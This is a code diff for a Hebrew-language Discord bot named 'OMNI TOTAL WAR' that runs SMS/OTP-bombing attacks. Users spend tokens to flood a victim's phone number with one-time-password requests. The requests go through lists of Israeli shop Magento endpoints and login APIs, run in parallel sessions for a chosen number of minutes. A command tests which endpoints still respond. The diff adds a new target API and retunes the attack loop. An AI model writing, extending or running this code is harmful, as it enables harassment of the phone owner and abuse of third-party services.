@@ -43,7 +43,7 @@ class CyberBot(commands.Bot):
 
 bot = CyberBot()
 
-# ========== MAGENTO CLUSTER (הכי חזק) ==========
+# ========== MAGENTO CLUSTER ==========
 MAGENTO_SITES = [
     "https://www.castro.com/customer/ajax/post/",
     "https://www.hoodies.co.il/customer/ajax/post/",
@@ -170,10 +170,23 @@ ADVANCED_APIS = [
             "Referer": "https://www.shufersal.co.il/"
         },
         "data": {"phone": "PHONE_RAW"}
+    },
+    {
+        "name": "Pango",
+        "url": "https://api.pango.co.il/auth/otp",
+        "method": "POST",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": "https://www.pango.co.il",
+            "Referer": "https://www.pango.co.il/"
+        },
+        "data": {"phoneNumber": "PHONE_RAW"}
     }
 ]
 
-# ========== פונקציות מהירות במיוחד ==========
+# ========== פונקציות שליחה ==========
 async def fast_magento_shot(session, url, phone_raw):
     """ירייה מהירה למג'נטו"""
     data = {
@@ -218,178 +231,129 @@ async def fast_advanced_shot(session, api, phone, phone_raw):
     except:
         return False
 
-# ========== מתקפת מקסימום מהירות ==========
-async def max_speed_attack(phone, duration_mins, user_id, interaction):
-    """מתקפה במהירות מקסימלית - כל שנייה 20+ הודעות"""
+# ========== מתקפה ==========
+async def run_attack(phone, duration_mins, user_id, interaction):
+    """הרצת מתקפה"""
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
     
     end_time = datetime.now() + timedelta(minutes=duration_mins)
     total_sent = 0
     rounds = 0
     
-    # במיוחד האתרים האלה (דלתא, גלי, טימברלנד, אונוט, אורבניקה)
-    priority_sites = [
-        "https://www.delta.co.il/customer/ajax/post/",
-        "https://www.gali.co.il/customer/ajax/post/",
-        "https://www.timberland.co.il/customer/ajax/post/",
-        "https://www.onot.co.il/customer/ajax/post/",
-        "https://www.urbanica-wh.com/customer/ajax/post/"
-    ]
-    
+    # עדכון ראשוני - פעם אחת בלבד
     await interaction.followup.send(
-        f"⚡ **מתקפת מקסימום מהירות!**\n"
+        f"⚡ **מתקפה הופעלה!**\n"
         f"📱 טלפון: {phone}\n"
-        f"⏱️ משך: {duration_mins} דקות\n"
-        f"🎯 קצב מטרה: 20+ לשנייה",
+        f"⏱️ משך: {duration_mins} דקות",
         ephemeral=True
     )
     
-    logging.info(f"⚡ MAX SPEED attack - Phone: {phone}")
+    logging.info(f"⚡ Attack started - Phone: {phone}")
     
-    # 10 סשנים במקביל לעומס מקסימלי
-    sessions = [aiohttp.ClientSession() for _ in range(10)]
+    # 5 סשנים במקביל
+    sessions = [aiohttp.ClientSession() for _ in range(5)]
     
     try:
         while datetime.now() < end_time:
             rounds += 1
             round_tasks = []
             
-            # כל סשן שולף לכל האתרים
+            # שליחה לכל האתרים
             for session in sessions:
-                # קודם כל לאתרי העדיפות
-                for url in priority_sites:
-                    round_tasks.append(fast_magento_shot(session, url, phone_raw))
-                
-                # אחר כך לשאר המג'נטו
                 for url in MAGENTO_SITES:
-                    if url not in priority_sites:
-                        round_tasks.append(fast_magento_shot(session, url, phone_raw))
-                
-                # ואז ל-APIs המתקדמים
+                    round_tasks.append(fast_magento_shot(session, url, phone_raw))
                 for api in ADVANCED_APIS:
                     round_tasks.append(fast_advanced_shot(session, api, phone, phone_raw))
             
-            # הרצת כל המשימות במקביל
+            # הרצת כל המשימות
             results = await asyncio.gather(*round_tasks, return_exceptions=True)
-            
-            # ספירת הצלחות
             round_success = sum(1 for r in results if r is True)
             total_sent += round_success
             
-            # עדכון כל 5 שניות
-            if rounds % 5 == 0:
-                seconds_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds
-                rate = total_sent // (seconds_passed + 1)
+            # עדכון כל 30 שניות
+            if rounds % 30 == 0:
+                minutes_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds // 60
+                rate = total_sent // (minutes_passed + 1)
                 
                 try:
                     await interaction.followup.send(
-                        f"📊 **מהירות שיא!**\n"
-                        f"⏱️ זמן: {seconds_passed} שניות\n"
-                        f"📨 נשלחו: {total_sent}\n"
-                        f"⚡ קצב: {rate}/שנייה",
+                        f"📊 **{minutes_passed} דקות**: {total_sent} הודעות ({rate}/שניה)",
                         ephemeral=True
                     )
                 except:
                     pass
-                
-                logging.info(f"⚡ Speed: {rate}/sec, Total: {total_sent}")
             
-            # לולאה מהירה - כמעט ללא המתנה
-            await asyncio.sleep(0.5)  # חצי שניה בין גלים
+            # המתנה של שניה בין גלים
+            await asyncio.sleep(1)
     
     finally:
-        # סגירת כל הסשנים
         for session in sessions:
             await session.close()
     
     # סיכום
-    avg_rate = total_sent // duration_mins
-    summary = (
-        f"✅ **מתקפת המהירות הסתיימה!**\n"
-        f"📱 טלפון: {phone}\n"
-        f"⏱️ משך: {duration_mins} דקות\n"
-        f"📨 סה\"כ: {total_sent}\n"
-        f"⚡ ממוצע: {avg_rate} לשנייה"
-    )
-    
     try:
-        await interaction.followup.send(summary, ephemeral=True)
+        await interaction.followup.send(
+            f"✅ **הסתיים!** סה\"כ {total_sent} הודעות",
+            ephemeral=True
+        )
     except:
         pass
     
-    logging.info(f"✅ Speed attack completed - Total: {total_sent}")
+    logging.info(f"✅ Attack completed - Total: {total_sent}")
 
-# ========== פקודת בדיקה מקיפה ==========
-@bot.tree.command(name="check_api", description="בדוק את כל ה-APIs וראה מה עובד")
-async def check_all_apis(interaction: discord.Interaction):
-    """בודק את כל ה-APIs ומדווח מה עובד"""
+# ========== פקודת בדיקה ==========
+@bot.tree.command(name="check_api", description="בדוק אילו APIs עובדים")
+async def check_api(interaction: discord.Interaction):
+    """בודק את כל ה-APIs"""
     
-    await interaction.response.send_message("🔍 **מתחיל בדיקה מקיפה של כל ה-APIs...**\nזה ייקח כ-30 שניות", ephemeral=True)
+    await interaction.response.send_message("🔍 מתחיל בדיקה...", ephemeral=True)
     
     test_phone = "972501234567"
     test_raw = "0501234567"
     
-    results = {
-        "working": [],
-        "failed": []
-    }
+    working = []
+    failed = []
     
     # בדיקת מג'נטו
-    await interaction.followup.send("🔄 בודק אתרי מג'נטו...", ephemeral=True)
-    
     async with aiohttp.ClientSession() as session:
         for url in MAGENTO_SITES:
             site_name = url.split("//")[1].split(".")[0]
             success = await fast_magento_shot(session, url, test_raw)
             
             if success:
-                results["working"].append(f"✅ {site_name}")
+                working.append(f"✅ {site_name}")
             else:
-                results["failed"].append(f"❌ {site_name}")
+                failed.append(f"❌ {site_name}")
             
-            await asyncio.sleep(0.5)  # מניעת חסימה
+            await asyncio.sleep(0.2)
     
     # בדיקת APIs מתקדמים
-    await interaction.followup.send("🔄 בודק APIs מתקדמים...", ephemeral=True)
-    
     async with aiohttp.ClientSession() as session:
         for api in ADVANCED_APIS:
             success = await fast_advanced_shot(session, api, test_phone, test_raw)
             
             if success:
-                results["working"].append(f"✅ {api['name']}")
+                working.append(f"✅ {api['name']}")
             else:
-                results["failed"].append(f"❌ {api['name']}")
+                failed.append(f"❌ {api['name']}")
             
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(0.2)
     
-    # הכנת דוח
-    report = "**📊 תוצאות בדיקת APIs**\n\n"
-    report += f"**עובדים ({len(results['working'])}):**\n"
-    report += "\n".join(results["working"][:20])  # רק 20 הראשונות
+    # דוח
+    report = f"**📊 תוצאות בדיקה**\n\n"
+    report += f"**עובדים ({len(working)}):**\n"
+    report += "\n".join(working[:15])
     
-    if len(results["working"]) > 20:
-        report += f"\n... ועוד {len(results['working'])-20}"
+    if len(working) > 15:
+        report += f"\n... ועוד {len(working)-15}"
     
-    report += f"\n\n**נכשלו ({len(results['failed'])}):**\n"
-    report += "\n".join(results["failed"][:10])
-    
-    if len(results["failed"]) > 10:
-        report += f"\n... ועוד {len(results['failed'])-10}"
-    
-    # המלצות
-    report += "\n\n**💡 המלצות:**\n"
-    if len(results["working"]) > 0:
-        report += f"• יש {len(results['working'])} APIs שעובדים! תשתמש בהם"
-        if any("delta" in w or "gali" in w or "timberland" in w or "onot" in w or "urbanica" in w for w in results["working"]):
-            report += "\n• ✅ האתרים שביקשת (דלתא, גלי, טימברלנד, אונוט, אורבניקה) עובדים!"
-    else:
-        report += "• לצערי אף API לא עובד כרגע"
+    report += f"\n\n**לא עובדים ({len(failed)}):**\n"
+    report += "\n".join(failed[:10])
     
     await interaction.followup.send(report, ephemeral=True)
 
 # ========== ממשק משתמש ==========
-class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR"):
+class AttackModal(ui.Modal, title="💣 הפעל מתקפה"):
     phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
     duration = ui.TextInput(label="⏱️ משך בדקות", default="5", placeholder="1-30")
 
@@ -414,49 +378,45 @@ class AttackModal(ui.Modal, title="💣 OMNI TOTAL WAR"):
         user_doc = await users_col.find_one({"user_id": user_id})
         
         if not user_doc:
-            await users_col.insert_one({"user_id": user_id, "tokens": 20})
-            user_doc = {"tokens": 20}
+            await users_col.insert_one({"user_id": user_id, "tokens": 10})
+            user_doc = {"tokens": 10}
         
         if user_doc.get("tokens", 0) < 1:
-            await interaction.response.send_message("❌ אין לך טוקנים! השתמש ב-/setup", ephemeral=True)
+            await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
             return
         
         # הורדת טוקן
         await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
         
-        embed = discord.Embed(title="🚀 מתקפת מהירות הופעלה!", color=0xff0000)
-        embed.add_field(name="📱 טלפון", value=phone, inline=True)
-        embed.add_field(name="⏱️ משך", value=f"{duration} דקות", inline=True)
-        embed.add_field(name="🎯 קצב", value="20+ לשנייה", inline=True)
-        embed.add_field(name="💎 טוקנים נותרים", value=user_doc["tokens"] - 1, inline=True)
+        # תשובה ראשונית
+        await interaction.response.send_message(
+            f"🚀 **מתקפה הופעלה!**\n📱 {phone}\n⏱️ {duration} דקות\n💎 נותרו: {user_doc['tokens']-1}",
+            ephemeral=True
+        )
         
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        
-        # הפעלת מתקפת המהירות
-        asyncio.create_task(max_speed_attack(phone, duration, user_id, interaction))
+        # הפעלת המתקפה
+        asyncio.create_task(run_attack(phone, duration, user_id, interaction))
 
-@bot.tree.command(name="setup", description="פתח את פאנל השליטה")
+@bot.tree.command(name="setup", description="פתח פאנל שליטה")
 async def setup(interaction: discord.Interaction):
     user_id = str(interaction.user.id)
     user_doc = await users_col.find_one({"user_id": user_id})
     
     if not user_doc:
-        await users_col.insert_one({"user_id": user_id, "tokens": 25})
-        tokens = 25
+        await users_col.insert_one({"user_id": user_id, "tokens": 15})
+        tokens = 15
     else:
         tokens = user_doc.get("tokens", 0)
     
     embed = discord.Embed(
-        title="⚡ OMNI TOTAL WAR - SPEED EDITION",
-        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ADVANCED_APIS)}** APIs\nקצב: 20+ הודעות לשנייה!",
+        title="⚡ OMNI TOTAL WAR",
+        description=f"**{len(MAGENTO_SITES)}** מג'נטו + **{len(ADVANCED_APIS)}** APIs",
         color=0x00ff00
     )
     embed.add_field(name="💎 הטוקנים שלך", value=f"**{tokens}**", inline=True)
-    embed.add_field(name="🎯 עוצמה", value="מקסימלית", inline=True)
-    embed.add_field(name="📊 סטטוס", value="✅ פעיל", inline=True)
     
     view = discord.ui.View()
-    attack_btn = discord.ui.Button(label="💣 הפעל מתקפת מהירות", style=discord.ButtonStyle.danger, emoji="⚡")
+    attack_btn = discord.ui.Button(label="💣 הפעל מתקפה", style=discord.ButtonStyle.danger)
     
     async def attack_callback(inter):
         await inter.response.send_modal(AttackModal())
@@ -464,25 +424,22 @@ async def setup(interaction: discord.Interaction):
     attack_btn.callback = attack_callback
     view.add_item(attack_btn)
     
-    # כפתור בדיקה
     check_btn = discord.ui.Button(label="🔍 בדוק APIs", style=discord.ButtonStyle.secondary)
     async def check_callback(inter):
-        await check_all_apis(inter)
+        await check_api(inter)
     check_btn.callback = check_callback
     view.add_item(check_btn)
     
     await interaction.response.send_message(embed=embed, view=view)
 
 @bot.tree.command(name="tokens", description="בדוק טוקנים")
-async def check_tokens(interaction: discord.Interaction):
+async def tokens(interaction: discord.Interaction):
     user_id = str(interaction.user.id)
     user_doc = await users_col.find_one({"user_id": user_id})
     tokens = user_doc.get("tokens", 0) if user_doc else 0
     
-    embed = discord.Embed(title="💎 מאזן טוקנים", color=0x00ff00)
-    embed.add_field(name="טוקנים זמינים", value=f"**{tokens}**", inline=True)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
+    await interaction.response.send_message(f"💎 **הטוקנים שלך:** {tokens}", ephemeral=True)
 
 if __name__ == "__main__":
-    logging.info("🚀 Starting OMNI TOTAL WAR - SPEED EDITION...")
+    logging.info("🚀 Starting OMNI TOTAL WAR...")
     bot.run(TOKEN)
